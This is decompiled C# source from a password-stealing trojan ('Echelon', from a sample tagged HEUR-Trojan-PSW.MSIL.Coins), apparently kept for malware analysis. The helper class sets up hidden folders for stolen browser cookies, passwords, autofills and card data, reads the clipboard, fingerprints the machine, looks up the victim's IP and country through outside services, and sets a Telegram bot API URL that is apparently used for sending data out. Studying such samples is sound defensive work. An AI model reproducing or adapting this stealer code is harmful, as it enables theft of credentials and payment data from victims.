// Decompiled with JetBrains decompiler
// Type: Echelon.Help
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.IO;
using System.Management;
using System.Net;
using System.Windows;
using System.Xml;

namespace Echelon
{
  public class Help
  {
    public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);
    public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
    public static string[] SysPatch = new string[3]
    {
      Help.LocalData,
      Help.AppDate,
      Path.GetTempPath()
    };
    public static string RandomSysPatch = Help.SysPatch[new Random().Next(0, Help.SysPatch.Length)];
    public static string Mut = Help.HWID;
    public static string HWID = Help.GetProcessorID() + Help.GetHwid();
    public static string GeoIpURL = "http://ip-api.com/xml";
    public static string ApiUrl = "https://api.telegram.org/bot";
    public static string IP = new WebClient().DownloadString("https://api.ipify.org/");
    public static string dir = Help.RandomSysPatch + "\\" + GenString.Generate() + Help.HWID + GenString.GeneNumbersTo().ToString();
    public static string Echelon_Dir = Help.dir + "\\" + GenString.GeneNumbersTo().ToString() + Help.HWID + GenString.Generate();
    public static string Browsers = Help.Echelon_Dir + "\\Browsers";
    public static string Cookies = Help.Browsers + "\\Cookies";
    public static string Passwords = Help.Browsers + "\\Passwords";
    public static string Autofills = Help.Browsers + "\\Autofills";
    public static string Downloads = Help.Browsers + "\\Downloads";
    public static string History = Help.Browsers + "\\History";
    public static string Cards = Help.Browsers + "\\Cards";
    public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");
    public static string DateLog = DateTime.Now.ToString("MM/dd/yyyy");
    public static string LoggerLog = Help.LocalData + "\\" + Help.DateLog + "_" + Help.HWID + ".txt";
    public static string ClipBoard = Clipboard.GetText();

    public static string CountryCOde()
    {
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
      return "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
    }

    public static string Country()
    {
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
      return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
    }

    public static string GetHwid()
    {
      string hwid = "";
      try
      {
        ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
        managementObject.Get();
        hwid = managementObject["VolumeSerialNumber"].ToString();
      }
      catch
      {
      }
      return hwid;
    }

    public static string GetProcessorID()
    {
      string processorId = "";
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
        processorId = (string) managementBaseObject["ProcessorId"];
      return processorId;
    }
  }
}
